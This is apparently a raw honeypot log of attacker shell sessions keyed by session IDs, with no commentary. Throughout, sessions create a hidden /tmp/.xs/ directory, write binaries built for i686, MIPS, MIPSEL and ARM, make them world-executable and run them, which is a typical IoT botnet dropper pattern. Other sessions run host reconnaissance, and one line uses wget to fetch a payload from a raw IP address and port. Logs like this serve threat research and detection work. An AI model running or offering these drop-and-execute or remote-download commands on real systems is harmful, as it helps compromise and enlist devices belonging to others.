b28c589634c448038243641f64818ac4	mkdir /tmp/.xs/
b28c589634c448038243641f64818ac4	cat  > /tmp/.xs/daemon.i686.mod
b28c589634c448038243641f64818ac4	chmod 777 /tmp/.xs/daemon.i686.mod
b28c589634c448038243641f64818ac4	/tmp/.xs/daemon.i686.mod
b6ab38491ab249ccb1ca55e064a0fb5e	mkdir /tmp/.xs/
b6ab38491ab249ccb1ca55e064a0fb5e	cat  > /tmp/.xs/daemon.mips.mod
b6ab38491ab249ccb1ca55e064a0fb5e	chmod 777 /tmp/.xs/daemon.mips.mod
b6ab38491ab249ccb1ca55e064a0fb5e	/tmp/.xs/daemon.mips.mod
174f1ad5642148c7a0459d6a1c2ab912	mkdir /tmp/.xs/
174f1ad5642148c7a0459d6a1c2ab912	cat  > /tmp/.xs/daemon.mipsel.mod
174f1ad5642148c7a0459d6a1c2ab912	chmod 777 /tmp/.xs/daemon.mipsel.mod
174f1ad5642148c7a0459d6a1c2ab912	/tmp/.xs/daemon.mipsel.mod
f32f60f2c51a4df688ce92bfacdc0237	mkdir /tmp/.xs/
f32f60f2c51a4df688ce92bfacdc0237	cat  > /tmp/.xs/test.mod
f32f60f2c51a4df688ce92bfacdc0237	chmod 777 /tmp/.xs/test.mod
f32f60f2c51a4df688ce92bfacdc0237	/tmp/.xs/test.mod
c62f7efc67bd403a98c673d4d320afb9	mkdir /tmp/.xs/
c62f7efc67bd403a98c673d4d320afb9	cat  > /tmp/.xs/daemon.armv4l.mod
c62f7efc67bd403a98c673d4d320afb9	chmod 777 /tmp/.xs/daemon.armv4l.mod
c62f7efc67bd403a98c673d4d320afb9	/tmp/.xs/daemon.armv4l.mod
3797555646344db999c5e0d7f5953877	mkdir /tmp/.xs/
3797555646344db999c5e0d7f5953877	cat  > /tmp/.xs/daemon.i686.mod
3797555646344db999c5e0d7f5953877	chmod 777 /tmp/.xs/daemon.i686.mod
3797555646344db999c5e0d7f5953877	/tmp/.xs/daemon.i686.mod
2126452ed7f240d79bfaa5436d2cb80f	mkdir /tmp/.xs/
2126452ed7f240d79bfaa5436d2cb80f	cat  > /tmp/.xs/daemon.mips.mod
2126452ed7f240d79bfaa5436d2cb80f	chmod 777 /tmp/.xs/daemon.mips.mod
2126452ed7f240d79bfaa5436d2cb80f	/tmp/.xs/daemon.mips.mod
c9201e89653f4ec99b492d86783f1422	mkdir /tmp/.xs/
c9201e89653f4ec99b492d86783f1422	cat  > /tmp/.xs/daemon.mipsel.mod
c9201e89653f4ec99b492d86783f1422	chmod 777 /tmp/.xs/daemon.mipsel.mod
c9201e89653f4ec99b492d86783f1422	/tmp/.xs/daemon.mipsel.mod
47bca418abb44afaa234b7a64902dec7	mkdir /tmp/.xs/
47bca418abb44afaa234b7a64902dec7	cat  > /tmp/.xs/test.mod
47bca418abb44afaa234b7a64902dec7	chmod 777 /tmp/.xs/test.mod
47bca418abb44afaa234b7a64902dec7	/tmp/.xs/test.mod
dd7bb06f213c425fb5c12f3fcb7a6d54	mkdir /tmp/.xs/
dd7bb06f213c425fb5c12f3fcb7a6d54	cat  > /tmp/.xs/daemon.armv4l.mod
dd7bb06f213c425fb5c12f3fcb7a6d54	chmod 777 /tmp/.xs/daemon.armv4l.mod
dd7bb06f213c425fb5c12f3fcb7a6d54	/tmp/.xs/daemon.armv4l.mod
f15a363a741248cbbcde269a42afe62a	mkdir /tmp/.xs/
f15a363a741248cbbcde269a42afe62a	cat  > /tmp/.xs/daemon.i686.mod
f15a363a741248cbbcde269a42afe62a	chmod 777 /tmp/.xs/daemon.i686.mod
f15a363a741248cbbcde269a42afe62a	/tmp/.xs/daemon.i686.mod
b25d7e9f0ea84d918abc60c52ca8a091	mkdir /tmp/.xs/
b25d7e9f0ea84d918abc60c52ca8a091	cat  > /tmp/.xs/daemon.armv4l.mod
45e976eb87b54adc97c0bcaacb779df7	mkdir /tmp/.xs/
45e976eb87b54adc97c0bcaacb779df7	cat  > /tmp/.xs/daemon.mips.mod
b25d7e9f0ea84d918abc60c52ca8a091	chmod 777 /tmp/.xs/daemon.armv4l.mod
b25d7e9f0ea84d918abc60c52ca8a091	/tmp/.xs/daemon.armv4l.mod
45e976eb87b54adc97c0bcaacb779df7	chmod 777 /tmp/.xs/daemon.mips.mod
45e976eb87b54adc97c0bcaacb779df7	/tmp/.xs/daemon.mips.mod
60cecd669f2e4d5d9fc22781c2c5b6dc	mkdir /tmp/.xs/
60cecd669f2e4d5d9fc22781c2c5b6dc	cat  > /tmp/.xs/daemon.i686.mod
51262bb7a1f9472ba1a75e47def0ae63	mkdir /tmp/.xs/
51262bb7a1f9472ba1a75e47def0ae63	cat  > /tmp/.xs/daemon.mipsel.mod
60cecd669f2e4d5d9fc22781c2c5b6dc	chmod 777 /tmp/.xs/daemon.i686.mod
60cecd669f2e4d5d9fc22781c2c5b6dc	/tmp/.xs/daemon.i686.mod
51262bb7a1f9472ba1a75e47def0ae63	chmod 777 /tmp/.xs/daemon.mipsel.mod
51262bb7a1f9472ba1a75e47def0ae63	/tmp/.xs/daemon.mipsel.mod
57ce44b1125741159b970d57cfed4e1c	mkdir /tmp/.xs/
57ce44b1125741159b970d57cfed4e1c	cat  > /tmp/.xs/daemon.mips.mod
931ef23e029d47f09b61655df2c76645	mkdir /tmp/.xs/
931ef23e029d47f09b61655df2c76645	cat  > /tmp/.xs/test.mod
57ce44b1125741159b970d57cfed4e1c	chmod 777 /tmp/.xs/daemon.mips.mod
931ef23e029d47f09b61655df2c76645	chmod 777 /tmp/.xs/test.mod
57ce44b1125741159b970d57cfed4e1c	/tmp/.xs/daemon.mips.mod
931ef23e029d47f09b61655df2c76645	/tmp/.xs/test.mod
4b4da17d489349a3a5e2824ff19a19bb	mkdir /tmp/.xs/
4b4da17d489349a3a5e2824ff19a19bb	cat  > /tmp/.xs/daemon.mipsel.mod
4b4da17d489349a3a5e2824ff19a19bb	chmod 777 /tmp/.xs/daemon.mipsel.mod
4b4da17d489349a3a5e2824ff19a19bb	/tmp/.xs/daemon.mipsel.mod
2bcd32eebaa243d193f46146fba05fba	mkdir /tmp/.xs/
2bcd32eebaa243d193f46146fba05fba	cat  > /tmp/.xs/test.mod
2bcd32eebaa243d193f46146fba05fba	chmod 777 /tmp/.xs/test.mod
2bcd32eebaa243d193f46146fba05fba	/tmp/.xs/test.mod
05e66a88cb6e4dda9e418c3c1ad7d74d	mkdir /tmp/.xs/
05e66a88cb6e4dda9e418c3c1ad7d74d	cat  > /tmp/.xs/daemon.armv4l.mod
05e66a88cb6e4dda9e418c3c1ad7d74d	chmod 777 /tmp/.xs/daemon.armv4l.mod
05e66a88cb6e4dda9e418c3c1ad7d74d	/tmp/.xs/daemon.armv4l.mod
77ab7b4b7909421b8a0e1e0b293f91dd	mkdir /tmp/.xs/
77ab7b4b7909421b8a0e1e0b293f91dd	cat  > /tmp/.xs/daemon.armv4l.mod
6737b2461fcc4760b6c1ffd5dea70b2b	mkdir /tmp/.xs/
6737b2461fcc4760b6c1ffd5dea70b2b	cat  > /tmp/.xs/daemon.i686.mod
77ab7b4b7909421b8a0e1e0b293f91dd	chmod 777 /tmp/.xs/daemon.armv4l.mod
77ab7b4b7909421b8a0e1e0b293f91dd	/tmp/.xs/daemon.armv4l.mod
6737b2461fcc4760b6c1ffd5dea70b2b	chmod 777 /tmp/.xs/daemon.i686.mod
6737b2461fcc4760b6c1ffd5dea70b2b	/tmp/.xs/daemon.i686.mod
05db7a78128844ac92013ac49fd7da07	mkdir /tmp/.xs/
05db7a78128844ac92013ac49fd7da07	cat  > /tmp/.xs/daemon.i686.mod
5ba3c547a7514f999288a0a887cb79c5	mkdir /tmp/.xs/
5ba3c547a7514f999288a0a887cb79c5	cat  > /tmp/.xs/daemon.mips.mod
05db7a78128844ac92013ac49fd7da07	chmod 777 /tmp/.xs/daemon.i686.mod
05db7a78128844ac92013ac49fd7da07	/tmp/.xs/daemon.i686.mod
5ba3c547a7514f999288a0a887cb79c5	chmod 777 /tmp/.xs/daemon.mips.mod
5ba3c547a7514f999288a0a887cb79c5	/tmp/.xs/daemon.mips.mod
f7a8f95329e848f98dae7dc9c22893f2	mkdir /tmp/.xs/
f7a8f95329e848f98dae7dc9c22893f2	cat  > /tmp/.xs/daemon.mips.mod
065709c3cd41452ea3ad3500445e8bc6	mkdir /tmp/.xs/
065709c3cd41452ea3ad3500445e8bc6	cat  > /tmp/.xs/daemon.mipsel.mod
f7a8f95329e848f98dae7dc9c22893f2	chmod 777 /tmp/.xs/daemon.mips.mod
065709c3cd41452ea3ad3500445e8bc6	chmod 777 /tmp/.xs/daemon.mipsel.mod
f7a8f95329e848f98dae7dc9c22893f2	/tmp/.xs/daemon.mips.mod
065709c3cd41452ea3ad3500445e8bc6	/tmp/.xs/daemon.mipsel.mod
f35046ae8ca44254a96b6f5e7843f63b	mkdir /tmp/.xs/
4e312851d7b64ff892590902ae318b4e	mkdir /tmp/.xs/
f35046ae8ca44254a96b6f5e7843f63b	cat  > /tmp/.xs/daemon.mipsel.mod
4e312851d7b64ff892590902ae318b4e	cat  > /tmp/.xs/test.mod
4e312851d7b64ff892590902ae318b4e	chmod 777 /tmp/.xs/test.mod
f35046ae8ca44254a96b6f5e7843f63b	chmod 777 /tmp/.xs/daemon.mipsel.mod
4e312851d7b64ff892590902ae318b4e	/tmp/.xs/test.mod
f35046ae8ca44254a96b6f5e7843f63b	/tmp/.xs/daemon.mipsel.mod
5459bcdc25b0415893a84eadc51b82af	mkdir /tmp/.xs/
5459bcdc25b0415893a84eadc51b82af	cat  > /tmp/.xs/test.mod
5459bcdc25b0415893a84eadc51b82af	chmod 777 /tmp/.xs/test.mod
5459bcdc25b0415893a84eadc51b82af	/tmp/.xs/test.mod
04da8d73ce83491cbdd5875c0fb3949c	mkdir /tmp/.xs/
04da8d73ce83491cbdd5875c0fb3949c	cat  > /tmp/.xs/daemon.armv4l.mod
04da8d73ce83491cbdd5875c0fb3949c	chmod 777 /tmp/.xs/daemon.armv4l.mod
04da8d73ce83491cbdd5875c0fb3949c	/tmp/.xs/daemon.armv4l.mod
e434580b928041caace568597edd2a0e	mkdir /tmp/.xs/
e434580b928041caace568597edd2a0e	cat  > /tmp/.xs/daemon.i686.mod
e434580b928041caace568597edd2a0e	chmod 777 /tmp/.xs/daemon.i686.mod
e434580b928041caace568597edd2a0e	/tmp/.xs/daemon.i686.mod
8466f5f769e34671931ab32f0f0be2bc	echo -n test
8466f5f769e34671931ab32f0f0be2bc	cat /proc/version
1698a93e931d4c61a8d930c25c85b62f	mkdir /tmp/.xs/
1698a93e931d4c61a8d930c25c85b62f	cat  > /tmp/.xs/daemon.armv4l.mod
1698a93e931d4c61a8d930c25c85b62f	chmod 777 /tmp/.xs/daemon.armv4l.mod
1698a93e931d4c61a8d930c25c85b62f	/tmp/.xs/daemon.armv4l.mod
e8f2f3736f6a42b88302b946dd6cfb7e	mkdir /tmp/.xs/
e8f2f3736f6a42b88302b946dd6cfb7e	cat  > /tmp/.xs/daemon.i686.mod
e8f2f3736f6a42b88302b946dd6cfb7e	chmod 777 /tmp/.xs/daemon.i686.mod
e8f2f3736f6a42b88302b946dd6cfb7e	/tmp/.xs/daemon.i686.mod
3877b6e39eaf476593f27da9541ce77c	mkdir /tmp/.xs/
3877b6e39eaf476593f27da9541ce77c	cat  > /tmp/.xs/daemon.mips.mod
3877b6e39eaf476593f27da9541ce77c	chmod 777 /tmp/.xs/daemon.mips.mod
3877b6e39eaf476593f27da9541ce77c	/tmp/.xs/daemon.mips.mod
2c851cebfa054e7db2dd854c2e10a369	mkdir /tmp/.xs/
2c851cebfa054e7db2dd854c2e10a369	cat  > /tmp/.xs/daemon.armv4l.mod
2c851cebfa054e7db2dd854c2e10a369	chmod 777 /tmp/.xs/daemon.armv4l.mod
2c851cebfa054e7db2dd854c2e10a369	/tmp/.xs/daemon.armv4l.mod
7f1597308ae74f02a0fc7bbc2a984167	mkdir /tmp/.xs/
7f1597308ae74f02a0fc7bbc2a984167	cat  > /tmp/.xs/daemon.i686.mod
7f1597308ae74f02a0fc7bbc2a984167	chmod 777 /tmp/.xs/daemon.i686.mod
7f1597308ae74f02a0fc7bbc2a984167	/tmp/.xs/daemon.i686.mod
4bda4b68dc2f4ee09c4010e04f885069	mkdir /tmp/.xs/
4bda4b68dc2f4ee09c4010e04f885069	cat  > /tmp/.xs/daemon.mips.mod
4bda4b68dc2f4ee09c4010e04f885069	chmod 777 /tmp/.xs/daemon.mips.mod
4bda4b68dc2f4ee09c4010e04f885069	/tmp/.xs/daemon.mips.mod
d6404f99031449ec880a671a935da1ad	uname
d6404f99031449ec880a671a935da1ad	free -m
d6404f99031449ec880a671a935da1ad	ps x
ba83e6f9463549f6a0a3fa577b1da717	uname
ba83e6f9463549f6a0a3fa577b1da717	free -m
ba83e6f9463549f6a0a3fa577b1da717	ps x
f56706d1105743eeb22e5a35935cbfac	uname
f56706d1105743eeb22e5a35935cbfac	free -m
f56706d1105743eeb22e5a35935cbfac	ps x
56ba4326b29f4fb6a28d23fb3ab7dff4	uname
56ba4326b29f4fb6a28d23fb3ab7dff4	free -m
56ba4326b29f4fb6a28d23fb3ab7dff4	ps x
05ea1f2375aa47edaac6428ef7a1b2da	uname
05ea1f2375aa47edaac6428ef7a1b2da	free -m
05ea1f2375aa47edaac6428ef7a1b2da	ps x
1debf3a7366d40dd93fe6bba2df56082	uname
1debf3a7366d40dd93fe6bba2df56082	free -m
1debf3a7366d40dd93fe6bba2df56082	ps x
633c00f7cc034e98ae038ac2d006f95c	uname
633c00f7cc034e98ae038ac2d006f95c	free -m
633c00f7cc034e98ae038ac2d006f95c	ps x
17e84d5eec354358b2a6064086665e05	uname
17e84d5eec354358b2a6064086665e05	free -m
17e84d5eec354358b2a6064086665e05	ps x
326a80b24bbc4561a7528b71602b6265	uname
326a80b24bbc4561a7528b71602b6265	free -m
326a80b24bbc4561a7528b71602b6265	ps x
422cc8da06214f3b97440a1e18cc52dc	uname
422cc8da06214f3b97440a1e18cc52dc	free -m
422cc8da06214f3b97440a1e18cc52dc	ps x
4dbc05f428cf4c368dfc63ac71ebd435	uname
4dbc05f428cf4c368dfc63ac71ebd435	free -m
4dbc05f428cf4c368dfc63ac71ebd435	ps x
00692354feac4a5f9d2666833235313b	uname
00692354feac4a5f9d2666833235313b	free -m
00692354feac4a5f9d2666833235313b	ps x
5130270081874a75908da5109a380181	uname
5130270081874a75908da5109a380181	free -m
5130270081874a75908da5109a380181	ps x
1777e96f08ca44c8973e25d6f8be7138	uname
1777e96f08ca44c8973e25d6f8be7138	free -m
1777e96f08ca44c8973e25d6f8be7138	ps x
523fad105a4644d1a422a014af965435	uname
523fad105a4644d1a422a014af965435	free -m
523fad105a4644d1a422a014af965435	ps x
a567d92b0970440190fd0cfe5b791f15	uname
a567d92b0970440190fd0cfe5b791f15	free -m
a567d92b0970440190fd0cfe5b791f15	ps x
8b9b177cb55246489e37293c2bfa3d0d	uname
8b9b177cb55246489e37293c2bfa3d0d	free -m
8b9b177cb55246489e37293c2bfa3d0d	ps x
5826e52a2d66450e99a2c8775b898ec9	uname
5826e52a2d66450e99a2c8775b898ec9	free -m
5826e52a2d66450e99a2c8775b898ec9	ps x
8a4d8211f4d341639489fac22e74f74c	uname
8a4d8211f4d341639489fac22e74f74c	free -m
8a4d8211f4d341639489fac22e74f74c	ps x
1eef3a26aa8f490cba065dbab2e3edd9	uname
1eef3a26aa8f490cba065dbab2e3edd9	free -m
1eef3a26aa8f490cba065dbab2e3edd9	ps x
3bea1b2c98a144318c33d160ebd1fd9f	wget -c http://23.247.5.22:2016/1111
8e069305ec414eb88d0fb246b05d3a07	echo -n test
8e069305ec414eb88d0fb246b05d3a07	cat /proc/version
150bc4276e7748b7b62340b343050d19	mkdir /tmp/.xs/
150bc4276e7748b7b62340b343050d19	cat  > /tmp/.xs/daemon.armv4l.mod
150bc4276e7748b7b62340b343050d19	chmod 777 /tmp/.xs/daemon.armv4l.mod
150bc4276e7748b7b62340b343050d19	/tmp/.xs/daemon.armv4l.mod
e1f6cc286cd94db681d2ca133067967b	mkdir /tmp/.xs/
e1f6cc286cd94db681d2ca133067967b	cat  > /tmp/.xs/daemon.i686.mod
e1f6cc286cd94db681d2ca133067967b	chmod 777 /tmp/.xs/daemon.i686.mod
e1f6cc286cd94db681d2ca133067967b	/tmp/.xs/daemon.i686.mod
fc43324e05514228b5f3910273ecf6a6	mkdir /tmp/.xs/
fc43324e05514228b5f3910273ecf6a6	cat  > /tmp/.xs/daemon.mips.mod
fc43324e05514228b5f3910273ecf6a6	chmod 777 /tmp/.xs/daemon.mips.mod
fc43324e05514228b5f3910273ecf6a6	/tmp/.xs/daemon.mips.mod
08561c4c54bc4f46905abafa928fb1d2	echo -n test
08561c4c54bc4f46905abafa928fb1d2	cat /proc/version
8c879652a21348169f950740d7522864	mkdir /tmp/.xs/
8c879652a21348169f950740d7522864	cat  > /tmp/.xs/daemon.armv4l.mod
8c879652a21348169f950740d7522864	chmod 777 /tmp/.xs/daemon.armv4l.mod
8c879652a21348169f950740d7522864	/tmp/.xs/daemon.armv4l.mod
aa16f6136b2349568de958d22b54031f	mkdir /tmp/.xs/
aa16f6136b2349568de958d22b54031f	cat  > /tmp/.xs/daemon.i686.mod
aa16f6136b2349568de958d22b54031f	chmod 777 /tmp/.xs/daemon.i686.mod
aa16f6136b2349568de958d22b54031f	/tmp/.xs/daemon.i686.mod
5c058cab9ac44e779840bdf01d7af582	mkdir /tmp/.xs/
5c058cab9ac44e779840bdf01d7af582	cat  > /tmp/.xs/daemon.mips.mod
5c058cab9ac44e779840bdf01d7af582	chmod 777 /tmp/.xs/daemon.mips.mod
5c058cab9ac44e779840bdf01d7af582	/tmp/.xs/daemon.mips.mod
dc1ec69f3b714de3b4b227d4ad48a3b7	mkdir /tmp/.xs/
dc1ec69f3b714de3b4b227d4ad48a3b7	cat  > /tmp/.xs/daemon.mipsel.mod
dc1ec69f3b714de3b4b227d4ad48a3b7	chmod 777 /tmp/.xs/daemon.mipsel.mod
dc1ec69f3b714de3b4b227d4ad48a3b7	/tmp/.xs/daemon.mipsel.mod
00d8f3bc2d5b41058622b1c0c84f8279	mkdir /tmp/.xs/
00d8f3bc2d5b41058622b1c0c84f8279	cat  > /tmp/.xs/test.mod
00d8f3bc2d5b41058622b1c0c84f8279	chmod 777 /tmp/.xs/test.mod
00d8f3bc2d5b41058622b1c0c84f8279	/tmp/.xs/test.mod
5dc1ea7ee5cd49f5a085e07f25a74397	mkdir /tmp/.xs/
5dc1ea7ee5cd49f5a085e07f25a74397	cat  > /tmp/.xs/daemon.armv4l.mod
5dc1ea7ee5cd49f5a085e07f25a74397	chmod 777 /tmp/.xs/daemon.armv4l.mod
5dc1ea7ee5cd49f5a085e07f25a74397	/tmp/.xs/daemon.armv4l.mod
2a2300ee1ce14f90b762d68937e7dc19	mkdir /tmp/.xs/
2a2300ee1ce14f90b762d68937e7dc19	cat  > /tmp/.xs/daemon.i686.mod
2a2300ee1ce14f90b762d68937e7dc19	chmod 777 /tmp/.xs/daemon.i686.mod
2a2300ee1ce14f90b762d68937e7dc19	/tmp/.xs/daemon.i686.mod
5cbb92edacfd450a8ac7afd6678eb7ef	mkdir /tmp/.xs/
5cbb92edacfd450a8ac7afd6678eb7ef	cat  > /tmp/.xs/daemon.mips.mod
5cbb92edacfd450a8ac7afd6678eb7ef	chmod 777 /tmp/.xs/daemon.mips.mod
5cbb92edacfd450a8ac7afd6678eb7ef	/tmp/.xs/daemon.mips.mod
e50afdfb83fe41948e4589a53f305f43	mkdir /tmp/.xs/
e50afdfb83fe41948e4589a53f305f43	cat  > /tmp/.xs/daemon.armv4l.mod
e50afdfb83fe41948e4589a53f305f43	chmod 777 /tmp/.xs/daemon.armv4l.mod
e50afdfb83fe41948e4589a53f305f43	/tmp/.xs/daemon.armv4l.mod
893a5f5f9ad54549b52fb362369a0a0a	mkdir /tmp/.xs/
893a5f5f9ad54549b52fb362369a0a0a	cat  > /tmp/.xs/daemon.i686.mod
893a5f5f9ad54549b52fb362369a0a0a	chmod 777 /tmp/.xs/daemon.i686.mod
893a5f5f9ad54549b52fb362369a0a0a	/tmp/.xs/daemon.i686.mod
b215ba3313164dbd802da08f1f2ea94b	mkdir /tmp/.xs/
b215ba3313164dbd802da08f1f2ea94b	cat  > /tmp/.xs/daemon.mips.mod
b215ba3313164dbd802da08f1f2ea94b	chmod 777 /tmp/.xs/daemon.mips.mod
b215ba3313164dbd802da08f1f2ea94b	/tmp/.xs/daemon.mips.mod
0dc4e2a8990a43e49bbf2d55296b3f63	mkdir /tmp/.xs/
0dc4e2a8990a43e49bbf2d55296b3f63	cat  > /tmp/.xs/daemon.armv4l.mod
0dc4e2a8990a43e49bbf2d55296b3f63	chmod 777 /tmp/.xs/daemon.armv4l.mod
0dc4e2a8990a43e49bbf2d55296b3f63	/tmp/.xs/daemon.armv4l.mod
21b6d0c605aa4dea8b4047caf524ee34	mkdir /tmp/.xs/
21b6d0c605aa4dea8b4047caf524ee34	cat  > /tmp/.xs/daemon.i686.mod
21b6d0c605aa4dea8b4047caf524ee34	chmod 777 /tmp/.xs/daemon.i686.mod
21b6d0c605aa4dea8b4047caf524ee34	/tmp/.xs/daemon.i686.mod
698f29d4ffea460ab4f2453ce46df38f	mkdir /tmp/.xs/
698f29d4ffea460ab4f2453ce46df38f	cat  > /tmp/.xs/daemon.mips.mod
698f29d4ffea460ab4f2453ce46df38f	chmod 777 /tmp/.xs/daemon.mips.mod
698f29d4ffea460ab4f2453ce46df38f	/tmp/.xs/daemon.mips.mod
bc2218fec1874ffa92013e6747e3042b	mkdir /tmp/.xs/
bc2218fec1874ffa92013e6747e3042b	cat  > /tmp/.xs/daemon.armv4l.mod
bc2218fec1874ffa92013e6747e3042b	chmod 777 /tmp/.xs/daemon.armv4l.mod
bc2218fec1874ffa92013e6747e3042b	/tmp/.xs/daemon.armv4l.mod
be5ac0d012924589946afe0ab6e59744	mkdir /tmp/.xs/
be5ac0d012924589946afe0ab6e59744	cat  > /tmp/.xs/daemon.i686.mod
be5ac0d012924589946afe0ab6e59744	chmod 777 /tmp/.xs/daemon.i686.mod
be5ac0d012924589946afe0ab6e59744	/tmp/.xs/daemon.i686.mod
84989076e95d400aa76bf1ab2c5d7d01	mkdir /tmp/.xs/
84989076e95d400aa76bf1ab2c5d7d01	cat  > /tmp/.xs/daemon.mips.mod
84989076e95d400aa76bf1ab2c5d7d01	chmod 777 /tmp/.xs/daemon.mips.mod
84989076e95d400aa76bf1ab2c5d7d01	/tmp/.xs/daemon.mips.mod
44bf63ccb6e8494f8093ab994f13c668	mkdir /tmp/.xs/
44bf63ccb6e8494f8093ab994f13c668	cat  > /tmp/.xs/daemon.armv4l.mod
44bf63ccb6e8494f8093ab994f13c668	chmod 777 /tmp/.xs/daemon.armv4l.mod
44bf63ccb6e8494f8093ab994f13c668	/tmp/.xs/daemon.armv4l.mod
a75b9ca61e4d44c8849d0e1def6062dd	mkdir /tmp/.xs/
a75b9ca61e4d44c8849d0e1def6062dd	cat  > /tmp/.xs/daemon.i686.mod
a75b9ca61e4d44c8849d0e1def6062dd	chmod 777 /tmp/.xs/daemon.i686.mod
a75b9ca61e4d44c8849d0e1def6062dd	/tmp/.xs/daemon.i686.mod
430dd6cb3849421e860fa7ae6ea7a58f	mkdir /tmp/.xs/
430dd6cb3849421e860fa7ae6ea7a58f	cat  > /tmp/.xs/daemon.mips.mod
430dd6cb3849421e860fa7ae6ea7a58f	chmod 777 /tmp/.xs/daemon.mips.mod
430dd6cb3849421e860fa7ae6ea7a58f	/tmp/.xs/daemon.mips.mod
a9d2cd7ad60442fe8f60cdf7291583d0	mkdir /tmp/.xs/
a9d2cd7ad60442fe8f60cdf7291583d0	cat  > /tmp/.xs/daemon.armv4l.mod
a9d2cd7ad60442fe8f60cdf7291583d0	chmod 777 /tmp/.xs/daemon.armv4l.mod
a9d2cd7ad60442fe8f60cdf7291583d0	/tmp/.xs/daemon.armv4l.mod
d3d7a7ab8b6041eb89def8dff6eb0677	mkdir /tmp/.xs/
d3d7a7ab8b6041eb89def8dff6eb0677	cat  > /tmp/.xs/daemon.i686.mod
d3d7a7ab8b6041eb89def8dff6eb0677	chmod 777 /tmp/.xs/daemon.i686.mod
d3d7a7ab8b6041eb89def8dff6eb0677	/tmp/.xs/daemon.i686.mod
946f471a4b9245c6b715024e79d2d75c	mkdir /tmp/.xs/
946f471a4b9245c6b715024e79d2d75c	cat  > /tmp/.xs/daemon.mips.mod
946f471a4b9245c6b715024e79d2d75c	chmod 777 /tmp/.xs/daemon.mips.mod
946f471a4b9245c6b715024e79d2d75c	/tmp/.xs/daemon.mips.mod
05b0a3d39c05413ab50f2ba8bd21bacf	mkdir /tmp/.xs/
05b0a3d39c05413ab50f2ba8bd21bacf	cat  > /tmp/.xs/daemon.armv4l.mod
05b0a3d39c05413ab50f2ba8bd21bacf	chmod 777 /tmp/.xs/daemon.armv4l.mod
05b0a3d39c05413ab50f2ba8bd21bacf	/tmp/.xs/daemon.armv4l.mod
7cb9a184be184db59ac8b439429478cd	mkdir /tmp/.xs/
7cb9a184be184db59ac8b439429478cd	cat  > /tmp/.xs/daemon.i686.mod
7cb9a184be184db59ac8b439429478cd	chmod 777 /tmp/.xs/daemon.i686.mod
7cb9a184be184db59ac8b439429478cd	/tmp/.xs/daemon.i686.mod
beacd1c2b54b4ea1ba506fcbfb5812d4	mkdir /tmp/.xs/
beacd1c2b54b4ea1ba506fcbfb5812d4	cat  > /tmp/.xs/daemon.mips.mod
beacd1c2b54b4ea1ba506fcbfb5812d4	chmod 777 /tmp/.xs/daemon.mips.mod
beacd1c2b54b4ea1ba506fcbfb5812d4	/tmp/.xs/daemon.mips.mod
b9b0401cf9ce41de97761492c47a7979	mkdir /tmp/.xs/
b9b0401cf9ce41de97761492c47a7979	cat  > /tmp/.xs/daemon.mipsel.mod
b9b0401cf9ce41de97761492c47a7979	chmod 777 /tmp/.xs/daemon.mipsel.mod
b9b0401cf9ce41de97761492c47a7979	/tmp/.xs/daemon.mipsel.mod
019aebad75f7409a84276beb7a75d159	mkdir /tmp/.xs/
019aebad75f7409a84276beb7a75d159	cat  > /tmp/.xs/test.mod
019aebad75f7409a84276beb7a75d159	chmod 777 /tmp/.xs/test.mod
019aebad75f7409a84276beb7a75d159	/tmp/.xs/test.mod
37e932f63f214e829b6d942f4e0c09c4	mkdir /tmp/.xs/
37e932f63f214e829b6d942f4e0c09c4	cat  > /tmp/.xs/daemon.armv4l.mod
37e932f63f214e829b6d942f4e0c09c4	chmod 777 /tmp/.xs/daemon.armv4l.mod
37e932f63f214e829b6d942f4e0c09c4	/tmp/.xs/daemon.armv4l.mod
efb4811c43af4628aacbc402d4941c70	mkdir /tmp/.xs/
efb4811c43af4628aacbc402d4941c70	cat  > /tmp/.xs/daemon.i686.mod
efb4811c43af4628aacbc402d4941c70	chmod 777 /tmp/.xs/daemon.i686.mod
efb4811c43af4628aacbc402d4941c70	/tmp/.xs/daemon.i686.mod
fd89aebe753845499d93d0798b048562	mkdir /tmp/.xs/
fd89aebe753845499d93d0798b048562	cat  > /tmp/.xs/daemon.mips.mod
fd89aebe753845499d93d0798b048562	chmod 777 /tmp/.xs/daemon.mips.mod
fd89aebe753845499d93d0798b048562	/tmp/.xs/daemon.mips.mod
6822bdc6a5b342679eb9197b978c91cf	mkdir /tmp/.xs/
6822bdc6a5b342679eb9197b978c91cf	cat  > /tmp/.xs/daemon.mipsel.mod
6822bdc6a5b342679eb9197b978c91cf	chmod 777 /tmp/.xs/daemon.mipsel.mod
6822bdc6a5b342679eb9197b978c91cf	/tmp/.xs/daemon.mipsel.mod
a8ce60b173b04996b7c33afb456b88fe	mkdir /tmp/.xs/
